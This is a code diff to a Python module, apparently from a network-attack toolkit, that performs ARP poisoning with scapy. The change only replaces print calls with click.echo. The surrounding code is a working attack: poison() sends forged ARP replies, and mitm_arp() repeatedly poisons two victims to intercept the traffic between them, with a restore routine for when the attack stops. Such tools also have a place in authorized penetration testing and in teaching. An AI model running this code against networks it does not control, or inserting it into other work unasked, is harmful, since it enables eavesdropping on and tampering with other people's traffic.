@@ -1,6 +1,7 @@
 '''This package contains everything related to ARP poisoning'''
 
 from time import sleep
+import click
 from scapy.all import ARP, send, conf
 from .general import get_target_mac
 
@@ -22,13 +23,11 @@ def poison(victim_ip, spoof_ip, victim_mac='', interface=''):
         # Create the ARP packet, scapy will add your MAC address for hwsrc
         # op=2 means that ARP is going to send answer
         packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
-   
-        # print(packet) #debugging
 
         # Send the ARP packet without output
         send(packet, verbose=False)
     except:
-        print('Victim not found')
+        click.echo('Victim not found')
 
 
 def restore_arp(victim_ip, spoof_ip, interface=''):
@@ -51,7 +50,7 @@ def restore_arp(victim_ip, spoof_ip, interface=''):
         # Send the ARP packet without output
         send(packet, count=4, verbose=False, iface=interface)
     except:
-        print('Victim not found')
+        click.echo('Victim not found')
 
 
 def mitm_arp(victim_1_ip, victim_2_ip, interface):
@@ -69,9 +68,9 @@ def mitm_arp(victim_1_ip, victim_2_ip, interface):
             poison(victim_2_ip, victim_1_ip, victim_2_mac, interface)
             sleep(2)
     except KeyboardInterrupt:
-        print('\nInterupted, Reseting ARP tables. Please wait')
+        click.echo('\nInterupted, Reseting ARP tables. Please wait')
         restore_arp(victim_1_ip, victim_2_ip, interface)
         restore_arp(victim_2_ip, victim_1_ip, interface)
-        print('\nARP table restored.')
+        click.echo('\nARP table restored.')
     except:
-        print('Victim not found')
+        click.echo('Victim not found')
